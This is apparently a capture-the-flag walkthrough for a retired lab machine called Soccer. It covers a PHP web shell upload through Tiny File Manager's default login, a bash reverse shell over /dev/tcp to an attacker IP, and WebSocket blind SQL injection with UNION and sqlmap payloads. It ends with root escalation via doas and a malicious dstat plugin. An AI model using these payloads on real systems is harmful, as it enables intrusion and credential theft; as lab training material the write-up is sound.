# Soccer

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2022--12--17-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | December 17, 2022 |
| **Rating** | 4.5 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Soccer is an Easy Linux machine featuring web exploitation through file upload, blind SQL injection via WebSocket, and doas privilege escalation. The main website hosts Tiny File Manager with default credentials, allowing PHP shell upload for initial foothold. A WebSocket endpoint on subdomain soc-player.soccer.htb:9091 is vulnerable to blind SQL injection, revealing credentials for SSH access. Root is achieved by exploiting doas configuration allowing execution of dstat with custom plugin injection.

---

## Recon

### Port Scan
```bash
nmap -sC -sV -T4 <TARGET_IP> -oN nmap-quick.txt
```
Key findings:
- Port 22: SSH OpenSSH 8.2p1
- Port 80: HTTP nginx 1.18.0
- Port 9091: HTTP (xmltec-xmlmail, likely WebSocket service)

### Web Enumeration
```bash
# Main site at soccer.htb
curl -sIL http://<TARGET_IP>/
# Standard sports-themed website

# Directory fuzzing
ffuf -u http://soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Found: /tiny/
```

**Subdomain Enumeration**
```bash
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.soccer.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 178
# Found: soc-player.soccer.htb
```

---

## Foothold

### Vulnerability
- **Type**: File Upload → Web Shell
- **Service**: Tiny File Manager (default credentials)
- **Discovery Method**: Directory enumeration + default credential testing

### Exploitation

**Step 1: Tiny File Manager Access**
```bash
# Access http://soccer.htb/tiny/
# Try default credentials: admin / admin@123
# Successful login
```

**Step 2: PHP Shell Upload**
```bash
# Create PHP reverse shell
<?php system($_GET['c']); ?>

# Upload via Tiny File Manager
# Accessible at: http://soccer.htb/tiny/uploads/shell.php
```

**Step 3: Establish Shell**
```bash
# Start listener
nc -lvnp 9001

# Trigger reverse shell
curl 'http://soccer.htb/tiny/uploads/shell.php?c=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.X/9001+0>%261"'
```

### Shell Obtained
- **User**: www-data
- **Access Method**: Reverse shell via PHP upload

---

## User Flag

### Path to User
Initial foothold as www-data is not sufficient for user flag. Need to escalate to user account.

### WebSocket SQL Injection

**Discovery**
```bash
# Subdomain soc-player.soccer.htb hosts ticket checking system
# Uses WebSocket at ws://soc-player.soccer.htb:9091/
# Check ticket functionality sends ticket ID via WebSocket
```

**Exploitation**
```python
#!/usr/bin/env python3
import websocket
import json

# WebSocket blind SQLi to extract data
# The ticket ID parameter is vulnerable

# Boolean-based blind SQLi via WebSocket
ws = websocket.create_connection("ws://soc-player.soccer.htb:9091/")

# Extract database name (length first)
# {"id": "1 AND LENGTH(database())=6--"}

# Extract player credentials
# Payload: {"id": "1 UNION SELECT group_concat(email,0x3a,password) FROM accounts--"}

# Extracted credentials: player:PlayerOftheMatch2022
```

Alternative using sqlmap-websocket:
```bash
# Use sqlmap with WebSocket proxy
sqlmap -u "ws://soc-player.soccer.htb:9091/" --data '{"id":"*"}' --dbms mysql --batch --dump
```

**SSH Access**
```bash
ssh player@<TARGET_IP>
# Password: PlayerOftheMatch2022
```

### Flag
```
[flag redacted]
```

---

## Privilege Escalation

### Enumeration
```bash
# Check sudo/doas permissions
doas -h
# doas is installed (OpenBSD sudo alternative)

# Check doas configuration
cat /usr/local/etc/doas.conf
```
Output:
```
permit nopass player as root cmd /usr/bin/dstat
```

### Vulnerability
- **Type**: doas privilege abuse via dstat plugin injection
- **Discovery Method**: doas.conf enumeration

dstat allows loading custom plugins from `~/.dstat/` directory. If run as root via doas, a malicious plugin executes with root privileges.

### Exploitation

**Step 1: Create Malicious dstat Plugin**
```bash
mkdir -p ~/.dstat

cat > ~/.dstat/dstat_exploit.py << 'EOF'
import os

# This code runs when dstat loads the plugin
os.system('chmod u+s /bin/bash')
EOF
```

**Step 2: Execute dstat with Plugin**
```bash
# Run dstat with our custom plugin
doas /usr/bin/dstat --exploit

# dstat loads all plugins from ~/.dstat/
# Our plugin sets SUID on /bin/bash
```

**Step 3: Root Shell**
```bash
/bin/bash -p
# Spawns root shell due to SUID bit
```

Alternative one-liner for direct root shell:
```bash
cat > ~/.dstat/dstat_pwn.py << 'EOF'
import os
os.system('bash -p')
EOF

doas /usr/bin/dstat --pwn
```

---

## Root Flag

### Path to Root
doas dstat with custom plugin → SUID bash → root shell

### Flag
```
[flag redacted]
```

---

## Attack Chain Summary
```
Port 80 (nginx) → /tiny/ Tiny File Manager default creds (admin:admin@123) → PHP shell upload → www-data shell → WebSocket at soc-player.soccer.htb:9091 → Blind SQL Injection → player:PlayerOftheMatch2022 → SSH as player → doas /usr/bin/dstat → Plugin injection → SUID bash → Root
```

## Tools Used
- nmap: Port scanning and service enumeration
- ffuf: Directory and subdomain fuzzing
- Tiny File Manager: File upload functionality
- websocket-client (Python): WebSocket SQL injection
- nc: Reverse shell listener

## Dead Ends
- Port 9091 initially appeared to be mail service but was actually WebSocket
- Direct privilege escalation from www-data not possible, required lateral movement to player user

## Key Techniques
- **Default Credentials**: Tiny File Manager admin:admin@123
- **PHP Shell Upload**: Exploiting file manager for web shell
- **WebSocket SQL Injection**: Blind SQLi through WebSocket protocol
- **doas Privilege Escalation**: Plugin injection in dstat when run via doas
- **Custom dstat Plugin**: Python code execution as root through dstat plugin mechanism

## Lessons Learned
- What worked well: Default credentials on file managers are common on Easy boxes
- What wasted time: Initially overlooked WebSocket as attack vector (port 9091)
- Key takeaway for future machines: WebSocket endpoints can be vulnerable to traditional web attacks; doas is OpenBSD's sudo and has similar misconfiguration risks with command-specific permissions

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
